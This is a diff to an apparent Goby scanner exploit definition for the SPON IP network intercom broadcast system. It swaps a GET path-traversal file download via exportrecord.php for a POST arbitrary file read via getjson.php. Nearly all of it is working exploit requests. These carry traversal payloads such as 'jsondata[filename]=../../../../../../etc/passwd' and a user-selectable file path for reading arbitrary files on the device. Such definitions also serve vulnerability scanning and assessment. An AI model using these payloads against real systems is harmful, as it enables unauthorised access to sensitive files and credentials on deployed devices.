@@ -1,12 +1,5 @@
-package exploits
-
-import (
-	"git.gobies.org/goby/goscanner/goutils"
-)
-
-func init() {
-	expJson := `{
-  "Name": "SPON IP network intercom broadcast system exportrecord.php any file download",
+{
+  "Name": "SPON IP network intercom broadcast system getjson.php Arbitrary file read",
   "Description": "World Bond Communication Co., Ltd. is an audio as the core of the Internet of things solution provider. An arbitrary file reading vulnerability exists in the IP network intercom broadcast system of WorldBond Communication Co., LTD., which can be used by attackers to obtain sensitive information",
   "Product": "SPON IP network intercom broadcast system",
   "Homepage": "https://www.spon.com.cn/",
@@ -22,7 +15,7 @@ func init() {
     {
       "name": "filepath",
       "type": "createSelect",
-      "value": "../php/exportrecord.php,C:/ICPAS/Wnmp/WWW/php/exportrecord.php,C:/windows/win.ini,/etc/passwd,/proc/version,/home/xc9000/Wnmp/WWW/php/exportrecord.php",
+      "value": "../php/getjson.php,../../../../../../windows/win.ini,../../../../../../etc/passwd,../../../../../../proc/version",
       "show": ""
     }
   ],
@@ -34,12 +27,14 @@ func init() {
     "OR",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/php/exportrecord.php?downname=c:/windows/win.ini",
+        "method": "POST",
+        "uri": "/php/getjson.php",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+        },
         "data_type": "text",
-        "data": ""
+        "data": "jsondata[filename]=../../../../../../windows/win.ini"
       },
       "ResponseTest": {
         "type": "group",
@@ -65,12 +60,14 @@ func init() {
     },
     {
       "Request": {
-        "method": "GET",
-        "uri": "/php/exportrecord.php?downname=../../../../../etc/passwd",
+        "method": "POST",
+        "uri": "/php/getjson.php",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+        },
         "data_type": "text",
-        "data": ""
+        "data": "jsondata[filename]=../../../../../../../etc/passwd"
       },
       "ResponseTest": {
         "type": "group",
@@ -99,12 +96,14 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/php/exportrecord.php?downname={{{filepath}}}",
+        "method": "POST",
+        "uri": "/php/getjson.php",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+        },
         "data_type": "text",
-        "data": ""
+        "data": "jsondata[filename]={{{filepath}}}"
       },
       "SetVariable": [
         "output|lastbody"
@@ -112,23 +111,17 @@ func init() {
     }
   ],
   "Tags": [
-    "file download"
+    "file read"
   ],
   "CVEIDs": null,
   "CVSSScore": "0.0",
   "AttackSurfaces": {
-    "Application": ["SPON IP network intercom broadcast system"],
+    "Application": [
+      "SPON IP network intercom broadcast system"
+    ],
     "Support": null,
     "Service": null,
     "System": null,
     "Hardware": null
   }
-}`
-
-	ExpManager.AddExploit(NewExploit(
-		goutils.GetFileName(),
-		expJson,
-		nil,
-		nil,
-	))
 }
